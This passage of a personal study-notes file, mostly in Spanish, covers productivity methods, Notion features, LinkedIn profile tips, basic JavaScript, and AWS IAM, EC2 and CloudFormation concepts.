   → palabras claves, en el centro lo mas importante
- Meta: son fines ultimos, mas globales, que pasos se deben de seguir
- Warren Buffet:
   → tomarse un tiempo a solas
   → realizar lista de 25 cosas a realizar
   → señala los 5 realmente relevantes, deshacerse de las otras 20

# Aplicando desing thinking
- revisar todo lo anterior y simplificarlo en keywords
- Areas importantes:
   → amor
   → intelecto
   → salud
   → espiritu
- affinity map
   → escribir cualquier objetivo importante
   → escribir valores o actividades importantes a priorizar
   → clasifique las ideas en las declaraciones “yo quiero”
   → crear grupos organizados en las categorias de los yo quiero

# Objetivos estrategicos (OKR)
- metodologia dada por google
- son respuestas a las preguntas
-  SMART:
   → specific
   → measurable
   → achievable
   → relevant
   → time based
- los objetivos deben ser:
   → anuales
   → mensuales
   → diarios
   → horas
   → minutos
-GOST:
   → marco de referencia entre meta, objetivo, estrategia, tactica
- Eisenhower
   → otra metodologia para la priorizacion, donde esta urgente y poco urgente, importante y poco importante

# Las 3 P de la productividad
- Planificar, calendizar, metas y actividades, creacion de listas, priorizar listas, conmutar tareas
- Persuadir, tecnica de la persuacion empatica, seguridad, siempre un porqué, no tomar desicion fuera de la personalidad, genera valor, libertad y comprension
- Persistir, resilencia es la adaptacion a la adversidad, no vida dura, solo momentos dificiles

# Getting things done
- has que las cosas pasen, preguntas con flujo
- que harias si lo que hicieras no te lo pagaran
- por que lo harias
- mejor practica, hacer lo que te propones
   → averigua lo que es importante
   → priorizalo
   → hazlo

# Como dejar de perder el tiempo
- hacer kanban

# Espacio y ciclos
- espacio
   → lugar sin interrupciones
   → designar una zona de trabajo
   → fijar un horario laboral
   → acceso a internet
   → iluminación
   → tecnologia + accesorios
   → mesa + silla de trabajo
- ciclos
   → definir cronotipo de trabajo

# Rituales y rutinas
- ritual
   → primer estadio de interaccion con otras personas
   → una tarea critica al dia
   → registra tu tiempo
   → duerme entre 6 y 8 ocho horas
   → nuestra eficacia depende de que tiempo es mejor
   → las primeras 4 horas despues de despertar son efectivas
   → pasear, hacer ejercicio, desconectarte
   → cambiar de habitacion y delimitar el espacio de trabajo
   → largas duchas
   → tener un cuaderno de notas
   → rompe la rutina
- rituales con rutina: la salud mental es la capacidad de trabajar y amar
   → cuando tenemos un habito ya no cuenta tanto hemos establecido una rutina
   → minimizar la incertidumbre
   → ahorrar energia mental
   → mantener la concentracion

# Habitos
- 10 tipos de hábitos para tener dentro de nuestra rutina:
   ◇ Físicos
   ◇ Afectivos
   ◇ Sociales
   ◇ Morales
   ◇ Intelectuales
   ◇ Mentales
   ◇ De higiene
   ◇ Costumbristas
   ◇ Saludables
   ◇ Recreativos
- habitos son conductas repetitivas y elegidas concientemente
- recordatorio: estimulo
- rutina: la accion ejecutada
- recompensa: benefico obtenido

# Metodo Ivy lee
- lista diaria de tareas
   → 6 tareas importante
   → priorizar y ordenas las 6 tareas
   → concertrarse en una sola tarea hasta terminarla
   → si alguna no termina, se pasa al dia siguiente
- deepwork
   → para producir a un nivel maximo, se debe trabajar con periodos prolongados con mayor concentracion
   → la filosofia monastica
   → la filosofia bimodal
   → la filosofia ritmica
   → la filosofia periodistica
- la tecnica de los grandes gestos
   → realizar un cambio radical dentro de la rutina
   → cultivar el ocio, desconectarse completamente

## Trabajo remoto
- el flujo es un estado de inmersión total
- remote first, administran trabajo distribuido, tienen procesos de reclutamiento bastante refinados, se tiene todo documentado
- automattic, basecamp, buffer - hay que investigarlas
- trabajo asincrono, no importa cuanto trabajes, sino lo que se entregue
- se buscan resultados
- niveles
   → accion no deliberada
   → recrear la oficina, online
   → adaptarse al medio
   → comunicación asíncrona
- se dice que es un privilegio y no un derecho
- seis tipos de reunion:
   → actualizacion de estatus
   → toma de decisiones
   → compartir informacion
   → resolucion de problemas
   → diseño e innovación
   → fortalecimiento de equipo
- mensajes asincronos
   → proporcionan detalles
   → acciones claras
   → fecha de vencimiento
   → acceso de un recurso en caso de tener dudas

# Home office
- 23 minutos para reconectarse en lo que anda entre tarea y tarea
- revisar el equipo y trabajar con ellos
- andar motivado
- ergonomiía
- establecer límites

# metodos de productividad
- calcular el objetivo al que llegar
- escribe la meta
- establece una fecha
- enumera los pasos
- clasifica los pasos
- a trabajar
- Moscow
   → must
   → should
   → could
   → would

</rich_text>
    </node>
    <node name="notion" unique_id="47" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625837110" ts_lastsave="1627235312">
      <rich_text>las bases de datos son practicamente tablas para organizar la información
se diferencias las tablas (simples) de las bases de datos en que tiene estructura

El método PARA es una forma de organizar información creado por Tiago Forte que te permite establecer una estructura simple y escalable para categorizar cada aspecto de interés, desde documentos hasta metas que quieras lograr. Este sistema consiste de cuatro espacios llamados Proyectos, Áreas, Recursos y Archivo (por eso se llama PARA), con los cuales podrás clasificar información relevante a distintos aspectos de tu vida de manera ordenada.

El sistema Getting Things Done o GTD, creado por David Allen, consiste en 5 pasos simples que debes aplicar para ordenar y filtrar la forma en la que recolectas información y tareas en el día a día. El método promete brindar un espacio estructurado para poder concentrarse y ser estratégico en la manera en la que completas tareas y obtienes información.
	- capturar
	- clasificar
	- organizar
	- refelexionar
	- enganche

La matriz Eisenhower es una herramienta creada por Stephen Covey y basada en la forma de trabajar del ex-presidente de los Estados Unidos Dwight D. Eisenhower. Esta se basa en las cualidades de importancia y urgencia de una tarea para determinar cómo completarla, en qué momento y organizar una lista de tareas según 4 niveles de prioridad. Es especialmente útil para definir un orden específico en el que completar tareas, saber cuándo delegar y liberar un poco de tiempo dentro de lo posible.
	- urgente e importante
	- urgente y no importante
	- no urgente e importante
	- No urgente y no importante
	
	
-----------------------------------------------------------------------------------------------------------------------------------
# Que es notion
- Herramienta de edición colaborativa y sistemas personalizados
- toma de notas
- se pueden tener bases de datos
   → reuniones
   → tareas
   → y varias cosas mas
- creación de dashboards
- nuevas paginas con canvas en blanco

# Bloques basicos
- se pueden escribir texto libre o 3 encabezados (h1, h2, h3), se les puede editar, hasta en ecuaciones
- se pueden crear varios tipos de listas:
   → tareas
   → viñetas
   → lista numerada
   → lista toggle, permite esconder contenido dentro de cada una
   → resaltadores, bloques de cita, bloque callout (permite escoger un icono)
   → separadores, separados en dos secciones diferentes
   → columnas y colores para personalizar bloques basicos
   → con los 6 puntitos se pueden mover y crear bloques --- crear landing page

# Bloques avanzados
- se encuentran en la segunda seccion
   → tablas de contenido, se dedican a conseguir todos los encabezados en la pagina y se muestran en forma de jerarquia
   → breadcrumbs
      ⇒ muestra el camino que se debe de tomar para llegar a la pagina donde estoy
   → ecuaciones, ecuaciones de bloque o de linea (estilo latex)
   → botones de plantilla, sirve para usar una configuracion de bloques y usarse en otros
   → mensiones: de persona (@), fecha (@, se pueden escoger recordatorios) o pagina

# bloques de media o embends:
- se puede agregar contenido de otras paginas
- imagenes
- paginas web
- archivos
- contenidos de aplicaciones

# Bases de datos
- en notion en base de datos
- generalmente se ven en tablas
- una forma en la que se organiza la información
- se pueden diferenciar los tipos de datos
- hay propiedades:
   → basicas:
      ⇒ titulo (texto)
      ⇒ texto, esta es opcional la anterior no
      ⇒ número para escribir numeros y darles formato
      ⇒ seleccion unica, menu de opciones (solo una)
      ⇒ seleccion multiple, aqui se pueden elegir varias etiquetas
      ⇒ fecha y persona son identicas a las mensiones
      ⇒ archivos que se pueden subir
      ⇒ chackbox para verdadero/falso
      ⇒ manejo de url con boton para ir a la pagina web
      ⇒ uso email y correo
   → avanzadas:
      ⇒ se actualizan automaticamente
      ⇒ fecha de creacion para cuando se captura cierta entrada
      ⇒ creado por, dice quien lo creo
- se puede organizar desde sort (nos permite ordenar por la propiedad que hallamos creado)
- los filtros para solo ver un subconjunto de la informacion, es como un sql
- vistas, nos deja ver diferentes formas de ver la información, nos permite calcular totales para cada final de columna
- tablero, nos muestra la informacion como tarjetas (un trello), se pueden calcular valores
- galeria, muestra toda la informacion en tarjetas estilo tablero
- lista, se ven los iconos y al lado las propiedades
- calendario, nos muestra las tareas y propiedades que se estan haciendo
- linea de tiempo, calendario con tabla... gantt
- relacionadas:
   → se crea una propiedad con nombre y el tipo en avanzados sera con relacion
   → rollup para obtener otras propiedades de la tabla relacionada, se puede hacer operaciones estadisticas basicas
   → se pueden relacionar consigo misma
   → sincronizada con dos columnas
   → no sincronizada solo crea una columna
- plantillas:
   → se pueden agregar plantillas para repetir bases de datos

# formulas
- puede calcular datos de 4 tipos diferentes
   → numeros
   → texto
   → fechas
   → booleanos
- las funciones se dividen:
   → numericas
   → texto
   → fechas
   → booleanos
   → de conversion

# Sistemas de productividad y organizacion
- El método PARA es una forma de organizar información creado por Tiago Forte que te permite establecer una estructura simple y escalable para categorizar cada aspecto de interés, desde documentos hasta metas que quieras lograr. Este sistema consiste de cuatro espacios llamados Proyectos, Áreas, Recursos y Archivo (por eso se llama PARA), con los cuales podrás clasificar información relevante a distintos aspectos de tu vida de manera ordenada.

- El sistema Getting Things Done o GTD, creado por David Allen, consiste en 5 pasos simples que debes aplicar para ordenar y filtrar la forma en la que recolectas información y tareas en el día a día. El método promete brindar un espacio estructurado para poder concentrarse y ser estratégico en la manera en la que completas tareas y obtienes información.
   → capturar
   → clasificar
   → organizar
   → refelexionar
   → enganche

- La matriz Eisenhower es una herramienta creada por Stephen Covey y basada en la forma de trabajar del ex-presidente de los Estados Unidos Dwight D. Eisenhower. Esta se basa en las cualidades de importancia y urgencia de una tarea para determinar cómo completarla, en qué momento y organizar una lista de tareas según 4 niveles de prioridad. Es especialmente útil para definir un orden específico en el que completar tareas, saber cuándo delegar y liberar un poco de tiempo dentro de lo posible.
   → urgente e importante
   → urgente y no importante
   → no urgente e importante
   → No urgente y no importante

# Proyectos:
- marco de tiempo
- tareas
- estado
- progreso
- se pueden organizar en un tabla
- tareas:
   → estado
   → fecha limite
   → prioridad
   → proyecto
- centro de conocimiento:
   → cualquier aspecto de la vida
   → tipo
   → links
   → archivos
   → etiquetas
   → fecha de creacion
- dashboards
   → puede ser compartido
   → puede ser personal

# Trucos e integraciones
- creacion de pagina web:
   → agregar permisos para compartir en web
   → se puede comentar
   → editar
   → y compartir como plantilla
- super.so
   → link y dominio propio
   → google analytics
- fruituonsite:
   → opensource
   → mas manual y permite personalizar paginas
- vercel:
   → se puede crear un pagina web a partir de una base de de datos de notion
- hostNotion y Notion2site:
   → lo mismo que site pero mas nativa
- Bloques globales:
   → primero se crea un bloque simple
   → 6 puntitos, se copia el link
   → despues del so/, se incluye todo el link sobrante
   → se queda el link con los datos desde el numeral
   → se pega en un subpagina
- agregado de mas columnas:
   → crear la estructura en paginas aparte
   → se one la pagina en el boton y se transforma el texto
   → se elimina el texto de la pagina creada
- bases de datos de color:
   → crear la base
   → crear un toggle y poner la base dentro del toogle
- widgets:
   → indify:
      ⇒ widgets personalizados
      ⇒ progreso de vida
      ⇒ contador
      ⇒ clima
      ⇒ countdown
   → aption:
      ⇒ paypal
      ⇒ omnicalculator
      ⇒ formulario de correo
      ⇒ link-copy
      ⇒ codigo html, copiar codigo y ponerlo en las paginas
- Web clipper:
   → sirve para guardar cosas en notion desde chrome
- app externas:
   → slack:
      ⇒ se pueden mandar actualizaciones de pagina a cualquier canal
   → chillipepper:
      ⇒ formularios enviados a las personas
   → wunderpresentation:
      ⇒ crear en una pagina la presentacion, toma el h1 como cada plantilla de la presentacion

Errores:
¿Qué símbolo se usa para crear y mencionar una nueva página?
¿A cuál de estos formatos no se puede exportar una página de Notion?
Una tabla, una lista y un calendario son diferentes ejemplos de bases de datos
Al usar un toggle para darle color a una base de datos, si luego saco la base de datos del toggle, no mantendrĂ¡ su color -- verdadero
Se pueden agregar múltiples columnas a las páginas, toggles y botones de plantilla arrastrando los bloques hacia la izquierda o derecha de otros bloques -- falso

</rich_text>
    </node>
    <node name="Optimizacio del perfil de linkedin" unique_id="146" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684703124" ts_lastsave="1684859999">
      <rich_text>Reputacion virtual
- Opinion que tiene alguien de algo
- la reputacion es la moneda que vale
- no podemos controlar lo que los demas piensan de nosotros
- 70% de los empleadores usan las redes sociales como filtro
- 70% de los profesionales de RRHH descartan candidatos por motivos relacionados a una mala reputacion online
- no publicar no es la solucion.. 57% no aceptan candidatos si no encuentran info de la persona
- eliminacion de ontenido controversial
- cambiar configuracion de privacidad
- desequitarse de publicaciones no deseadas
- cura tus redes
   → actua como una marca
   → participa en eventos relacionados con tus intereses
   → haz voluntariado
   → comenta en linkedin
   → crear una red profesional
- en linkedin existe una herramienta para reputacion, indice de ventas con redes sociales
- se debe de ser consistente

posicionamiento profesional
busqueda laboral efectiva

como usan linkedin los reclutadores
- es la plataforma #1 para crear una red profesional
- base de datos gigante de candidatos, se aplican filtros y tiene mas alcance que otras plataformas
- 20 segundos para convencer si nos interesa o no
- no son detectives, entre mas info es mejor para ellos, el quiere llenar vacantes abiertas
- trabajan para clientes no para ti
- se tienen varias herramientas, recruiter lite, permite 20 filtros para encontrar talento, contactos de primer, segundo y tercer grado

Define tu objetivo profesional
- area laboral, eleccion de solo uno
- geografia, cada lugar del mundo es diferente
- industria
- tipo de organizaciones,
   → ong
   → privadas
   → publicas
   → startups
   → grandes comporaciones
- tipo de empleo
   → jornada completa/parcial
   → remoto
   → en oficina

palabras claves
- habilidad, conocimiento, experiencia diferenciadora en base a tu objeto profesional
- evitar usar keyword stuffing, no usar mucho una palabra
- usando el buscador de empleos ayuda a buscar que palabras claves se pueden usar para ser mas atractivo
- jobscan, copia perfil de linkedin y se puede comparar con el trabajo que andas buscando
- identificar las brechas de conocimiento

identifica tus secciones clave
- a donde se tiene que enforcar la energia
- cual es la propuesta unica de valor
- ponerse en los pies de las personas que miran en el perfil, sobre todo en educacion
- cual es la contribucion desde el rol que tengo (en zeb esta en blanco)
- metodologias y tecnologias que se usan
- sin pena por escribir todo lo que se hace
- en linkedin es mejor ser lo mas especifico posible
- verbos de accion
   → desarrollar
   → crear
   → liderar
   → implementar
   → diseniar
   → producir
   → mejorar
- usar licencias y certificacion como accion clave
- es importante saber en que idioma sera el perfil

Preferencias de empleo
- se ponen 5 opciones en tengo “interes en”
- editacion de ubicacion donde se busca empleo
- fecha de inicio, de manera inmediata o flexible
- tipo de empleo, tiempo para laborar
- se agrega el marco opentowork si se da a todos los miembros de linkedin

Crea marca personal acorde al proposito
- es lo que dice la gente de ti cuando no estas en la sala
- partes
   → foto de perfil
   → titular
   → foto de fondo
   → acerca de
   → contenido digital
- como se persive
   → especialista vs generalista
   → lider
   → experto
   → organizaciones a atraer

Elabora tu elevador pitch
- discurso de ascensor
- oportunidad de venta
- 3 parrafos de maximo 4 lineas
- en primer persona
- estructura
   → quien soy y a quien ayudo
   → que me apasiona
   → que hace unico a mi perfil

Alimenta tu pagina de inicio con contenido relevante
- contratar es una inversion
- los empleadores quieren candidatos informados

Implementa una busqueda laboral equilibrada
- cuales van a ser mis canales
- pequenia investigacion de acuerdo a lo que uno quiere y donde quiere trabajar
- interactuar con el sector a donde uno quiere entrar, eventos
- leer articulos de la industria, seguir influencers

Conectar con los empleadores de tus suenios
- haciendo contacto directo con las empresas
- existe un mercado laboral oculto, que ocupa el 75%
- equipos creados por personas referidas
- uso de la tecnica de la cascada
   → CEO si es pequenia
   → Manager del area, si no es tan pequenia
   → Recursos humanos, si es muy grande
- tres tpos de personas
   → antipaticos, no contestan el mensaje
   → obligados, solo para sentirse bien
   → potenciadores, querer ayudar de manera genuina

mensajes efectivos de contacto
- calidad mata cantidad
</rich_text>
    </node>
  </node>
  <node name="Road to code" unique_id="48" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="#a52a2a" ts_creation="1620311539" ts_lastsave="1651193071">
    <node name="introducion al desarrollo web" unique_id="49" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1620311550" ts_lastsave="1621279593">
      <rich_text># Como empezo todo
- se queria resolver calculos
   → ábaco
   → calculadoras mecanicas
   → computadoras humanas, libros de calculos
   → primeras computadoras, los primeros programadores fueron mujeres
   → tarjetas perforadas
   → codigo maquina
   → primeros lenguajes de programación

# inputs y outputs
- entrada -&gt; proceso -&gt; salida
</rich_text>
    </node>
    <node name="javascript" unique_id="50" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1621291941" ts_lastsave="1621433512">
      <rich_text># Tipos de variables
- representacion de un valor en memoria
- var [nombre] = [valor], sirve para que sepa que es una variable

# Hoisting
- solo funciona con ecmascript 5 para abajo
- variables y funciones se declaran antes que se procese el codigo

# Coherción
- dos tipos:
   → implicitas, cuando el lenguaje nos ayuda de una tipo a otro
   → explicitas, forma en que obligamos de un tipo a otro

# Truthy and Falsy
- valores verdaderos y falsos por defecto</rich_text>
    </node>
    <node name="ecmaScript" unique_id="51" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1621639589" ts_lastsave="1621639756">
      <rich_text># Default params y concatenacion
- </rich_text>
    </node>
    <node name="js y v8" unique_id="52" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1622420892" ts_lastsave="1622467957">
      <rich_text># Javascript engine</rich_text>
    </node>
    <node name="asincronismo" unique_id="53" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1622842506" ts_lastsave="1623727205">
      <rich_text># Asincronismo
- acción que no ocurre al mismo tiempo

# Que es un callback
- es una funcion que al crearla se le pasa como parametro otra funciòn

¿Cual es el método recomendando por la comunidad para manejar asincronismo en JavaScript?
¿Nos permite definir una función así­ncrona? 
¿Para qué nos sirve el método "catch()"?
</rich_text>
    </node>
  </node>
  <node name="AWS" unique_id="79" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1651193071" ts_lastsave="1685390640">
    <node name="Basic" unique_id="80" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1651193078" ts_lastsave="1652038925">
      <rich_text>IAM
- service global
- root shouldn't be used or shared
- User can be grouped and are people
- permissions are JSON Document called policies
   → This defines the permissions
   → apply the least privilege principle
- tags is for information of users
- change num of account by alias
- policies:
   → Version, 2012-10-17
   → ID, identifier optional
   → Statement, one or more (required)
      ⇒ Sid, identifier (optional)
      ⇒ Effect (ALLOW; DENY)
      ⇒ principal, account, user, role to applied
      ⇒ action: action
      ⇒ resources: list of resources
      ⇒ condition: applies or not (optional)
- MFA is for more security
   → protects root and aws accounts
   → you know + you own
   → authy multidevice
   → yubikey, multiple root and user
- strong passwords, with expiration, not reuse
- to access in AWS exists
   → AWS managment console
   → AWS CLI, command in the shell
   → AWS SDK, for code, in C++, Python, Go, Java, Javascript, Php, Ruby, Nodejs, Android, Ios, Embedded C arduino
- CloudShell
   → icon in aws ui, is not in all regions
   → is possible use the cli, and use v2
- Roles for services
   → some services need to perform actions
   → assing role to services
   → common
      ⇒ EC2
      ⇒ Lambda
      ⇒ Cloudformation
- IAM Security Tools
   → IAM Credentials Report (account-level)
      ⇒ lists all account's users and the status
   → IAM Access Advisor (user-level)
      ⇒ show the service permissions granted to a user, and last accessed
      ⇒ use to check policies
- Best practices
   → don't use the root account
   → phyisical user = aws user
   → users in groups, permissions to groups
   → strong password policyenforce MFA
   → create and use roles to aws services
   → use keys only for programmatic access
   → audit permissions of tha accounts an reports
   → never share IAM &amp; access keys
- Responsability
   → aws
      ⇒ infraestructure
      ⇒ configuration and vulnerability
      ⇒ compliance validation
   → you
      ⇒ User, grouos, roles, policies
      ⇒ enable MFA
      ⇒ rotate all keys
      ⇒ IAM to apply appropiate permissions
      ⇒ Analyze access and review permissions

EC2
- billing, IAM user hasn't permissions in billing, is necesary root, or grant permissions to IAM
- AWS free tier
- create a budget to calculate use of costs, configure alerts, in percent use of budget to email
- is one most popular aws offering
- elastic compute cloud = IAAS
- renting virtual machine
- storing data EBS
- Distributing load across machines ELB
- Scaling services (ASG
- this is fundamental to understand how cloud workd
- operating system: linux, windows or macos
- ram and CPU is selected
- storage space:
   → network attached (EBS &amp; EFS)
   → hardware (EC2 instance Store)
   → Network card speed of the card, Public Ip Address
   → firewall rules: security groups
- bootstrap script (configure at first launch), EC2 User Data
- is possible use one script when is launched he first time the EC2 instance
- EC2 data scripts runs as root
- t2.micro is in free tier
   → selecy user data in configure instance details to execute a script
   → key pairs is required to conect is type RSA
- the ip public is change when is sopped the manchine and restart
- instances types:
   → 7 types
   → eveery type is for specific purpose
   → nom (m5.2xlarge):
      ⇒ m: instance class
      ⇒ 5: generation
      ⇒ 2xlarge: size of instance
- security groups
   → fundamentals of network security
   → control how traffic is allowed in ec2
   → only contains allow rules
   → can refered by IP or by security group
   → they regulate
      ⇒ access to ports
      ⇒ ip range
      ⇒ control of inbound and outbound network
      ⇒ can attached to multiple ionstance
      ⇒ down to a region / vpc combination
      ⇒ live outside the ec2
      ⇒ all inbound traffic is blocked by default, all outbound traffic is authorised by default
- for linux server is important use the ssh, this is secure, it is a command line mac, linux and win 10 and latest, to minor version of windows is necesary Putty
- in web browser is possible in all OS
- is the most importante function to connect to EC2, generally is used the port 22
- is necesary the pem key to connect to ssh: ssh -i pem user@ip
- is required que key has the permission 0400
- in windows is necessary save key to use with putty as PPk to connect
- in windows 10 is possible use powershell, is necessary chenge teh security, the owneto change, and remove another users 
- all instance has aws-cli
- is necesary to cofigure a role to access the services, use key and secrets is not a good idea
- instances pruchase options:
   → On demand instances, short workloads, predicitble pricing, pay by second
   → reserver (1 to 3 years), long workloads, flexible instances convertible, specific instance attributes, different types of payments
   → saving plans (1 to 3 years), commitment to an amout of usage, is more specific time use, region and family
   → spot, short workloads cheap can los instances, use with data process and not database
   → dedicates hosts, book and entire physical serverl
   → dedicated instance, no other customer will share your hardware
   → capacity reservation, reserve capacity in a specific AZ no discounts
- shared rsponsabilities
   → aws
      ⇒ insfraestrtructure
      ⇒ isolation on physical hosts
      ⇒ replacing faulty hardware
      ⇒ compliance validation
   → own
      ⇒ security groups
      ⇒ Os Patches and updates
      ⇒ software and utilities installed
      ⇒ AM roles in EC2</rich_text>
    </node>
    <node name="CloudFormation" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1651197180" ts_lastsave="1657057643">
      <rich_text>JSON is horrible to CF
is possible use CF and JSON
-- YAML
Key values pair
Nested objects
support arrays
Multi line string with |
can include comments

for every resource in CF is necesary define in:
</rich_text>
      <rich_text foreground="#6262a0a0eaea">Resources:
	Name:
		type:
		properties</rich_text>
      <rich_text>:

EC2 update with some interruption
Iam with no interruption
replacement
	recreating the resource
	creates the new resource or change logical ID
	for example an RDS DB

Options
	tags
	permission, specified by role
	notifications options
	timeout
	rollback on failure
	Rollback configuration
	Stack policy
	termination protection
	quick start link
	
Designer
	visualize a cloudformation stack
	used to verify if template us well created
	
building blocks
	AWSTemplateFormatVersion: 2010-09-09
	Description: Comments
	Transforma: specifies one or more Macros to process the template
	Metadata
	Resources: aws resources (mandatory)
	Parameters: the dynamic inputs
	Mappings: the static variables
	Outputs: Referencies
	condicionalust: list of conditions to perform resource creation
	Rules: validate a parameters durin stack creation/update
	helpers:
		references
		functions
		
deploying:
	manual way
	automated way
		using aws cli
		
Cost:
	use the link stimated cost, sends to simple monthlu calculatos

what is a parameters
	are a way to provide inputs to templates
	they're important:
		to reuse the templates across company
		some inputs can not be determined ahead of time
	controlled and can prevent errors from happening in your templates
	parameters can be cross-validate using rules
	
Parameters:
	{name}:
		Type: {type}
		Description: {description}
		ConstraintDescription: {string}
		Min/MaxLength: number
		Min/MaxValue
		AllowedValues: {array}
		AllowedPattern: {regex}
		NoEcho: {Boolean}
	reference parameter:
		with the function Fn::Ref
	Not used in:
		AWSTemplateFormatVersion
		Description
		Transform
		Mappings
	the shorthand for this in YAML is !Ref
	
SSMParameters:
	references to SSM
	specify ssm parameter key as the value
	CF fetches the lastest value
	CF doesn't store security string values
	validation on ssm parameter keys, but no values
	Supported ssm parameters
		- AWS::SSM::Parameter::Name
		- AWS::SSM::Parameter::Value&lt;String&gt;
		- AWS::SSM::Parameter::Value&lt;List&lt;String&gt;&gt;
		- AWS::SSM::Parameter::Value&lt;CommaDelimitedList&gt;
		- AWS::SSM::Parameter::Value&lt;AWS-Specific Parameter&gt;
		- AWS::SSM::Parameter::Value&lt;List&lt;AWS-Specific Parameter&gt;&gt;
		
Resources
	are the core of CF (Mandatory)
	represent aws components, will be created and configured
	resources are declarad and can reference
	Specified creation, updates and deletes
	more of 700 types
	identifiers ar form:
		AWS::aws-product-name::data-type-name
	optional atts:
		dependsOn:
			use to draw a dependency between two resources
			ex: create ecs after of ASG
			use with any resource
		deletionPolicy:
			protect resource from being deleted even if CF stack is
			 deleted (RDS)
			control what happens if a resource or CF is delete from CF
			Retain: resources is preserved or backup, to keep a resource
			Snapshot: EBS Volume, ElastiCache cluster and ReplicationGroup, RDS DB Instance, Clusters, Redshitf, Neptune DBCluster
			Delete: default, remove all, DBCluster and DBInstance default is Snapshot and in S3 is necesary that this is empty
		updateReplacePolicy:
			protects resources of being replacing
			that happens if a resource is updated
			updating RDS DB Avialability zon
			Use with any resource
			Delete: (default), delete old an create a new
			Retain: Keeps the resource
			Snapshot: EBS Volume, ElastiCache cluster and ReplicationGroup RDS DB Instance, Clusters, Redshitf, Neptune DBCluster, does not exists in CF scope
		creationPolicy: more details in the CFN init section
		updatePolicy: specific resources
		Metadata: anything
	is possible create dynamic number of resources, using macros and transform
	almost services is soported by CF
	
Mappings:
	are fixed varibles within CF
	this is handy with different envs, regios, AMI types
	all values are hardcoded
	this is used when the values can be taken from variables, for exameple, regios, aws account
	they allow safer control over the template
	
Funtion for mappings:
	Fn::FindInMap = !FindInMap[ MapName, TopLevelKey, SecondLevelKey ]
	
Pseudo parameters in CF
	parameters of type: “AWS::{something}”
	
Output:
	delares optional outputs values that can import from another CF
	is posible see the outputs in console of aws or by cli
	very useful for example if is defined a network with CF, varibales as VPCID or subnet id
	the best collaboration from cross stacks
	is necesary the !ImportValue {name} to get the value of output
	is not possible delete the stack until all references are deleted too

conditions
	are used to control the creation fo resources or outputs
	can be whatever tou want them to be, but commons ones are:
		environment
		aws region
		any parameter value
	each condition can references anorther condition, parameter or mapping
	define:
		CreatesSome: !Equals [ !Ref EnvType, prod ]
		is possible use:
			Fn::And, Fn::Equals, Fn::If, Fn::Not, Fn::Or
		
		applied to resources/outpus/...
		iif for example in mount point exists volume attach and the exists condition and is False this is not mounted
		
Rules
	parmeter section gives us abality to validate within a single parameter
	to perform parameter validations based in another parameters (crsoss parameter validation)
	for example all subnets are within the same vpc
	define:
		Rule:
			Rule Condition(optional): determines when rule take effect
			Assertion: describe what value are allowed for a partivular paramter, one or more
	support funtions(all with Fn::): And, Contains, EachMemeberEquals, EachMemberIn, Equals, If, Not, Or, RefAll, VoueOf, ValueOfAll
	
Metadata
	optional, include details about the template or resource
	does not provoque impacts
	exist 4 metadata keys
		AWS::CloudFormation::Designer, resources are laid out in template
		AWS::CloudFormation::Interface, grouping an orderinf og input parameter, is possible change the ordering in AWS interface, and group with a label
		AWS::CloudFormation::Authentication, specified auth credentials for files or sources this on Init
		AWS::CloudFormation::Init, define configuration tasks for cfn-init, it is the more powerful
	is possible overwritte the 4 metadata keys
	
CFN_Init and EC2 User Data
	Many of CF templates will be about provisioning computing resources
	resources can be either:
		EC2 Instances
		Auto Scaling Gtoups
	The instance to be self configured, to execute the work
	fully automate EC2 Fleet state with CF Init
	this is execute the first boot of the instance
	
	the problem with User Data is
		if the configuration is vere large
		what append if exists a change and the previos EC2 without termintaion
		make user-data more readable
		how to know if script finished
	Using helper scripts
	using Init of CF and the flow: cfn-init, cfn-signal, cfn-get-metadata and cfn-up (this is optional)
	
	command are execute in alphebical order
	
Drift
	the cf does not protect of manual configuration changes
	to know if exists changes is used CF drift
	detect drift on an entire stack or on individual
	we can resolver stack/resources drift by using resource import
	Not all resources are supported
	
Nested stack
	stacks as part of another stack
	allow isolate repeat patterns/common components and use from another stack
	this is a best practice
	is necessary to update a stack, update the parent stack
	is possible have multiple nested stack in anohter nested stack
	is important always apply the modification in root stack
	nested vs cross
		cross
			when stacks have different lifecycles
			use outputs exports
			pass values to many stacks (VPC id, etc)
		nested
			when components must be re-used
			only is important to the higher level (it's not shared)
			
			
Stacks Sets
	Create, update or delete stacks across multiple accounts and regions with one operation
	only the administrator create stacksets
	when the stack is updated all stack associeted is updated
	is possible execute in all accounts


ChangeSets
	when update the stack, to know what changes will happend before applying
	won't say if the update will be successful
	in nested stacks, is necesary changes across all stacks
	is possible select if is appliying in nested
	
Stack creation failures
	tried to create som resource
	one resource failed
	CF rolled back the resource
	the status ROLLBACK_COMPLETE
	to resolve is necesary delete and create new stack
	
Custom resources
	enable you write custom provision logic, create, delete and update
	define with:
		AWS::CloudFormation::CustomResource
		Custom::MyCustomResourceTypeName (recommended)
	two types:
		Aws SNS-backed
		AWS lambda-backed
	use cases:
		when AWS resource is not covered yet
		an on premise resource
		Running a lambda to empty an S3 bucket
		fetch an AMI id
		
WaitConditions
	pause tje creation of stack and wait for a signal before continues
	ex. create another resource when is full config a ec2 with one app
	props:
		Count - deafult 1
		Timeout - max 12hr.
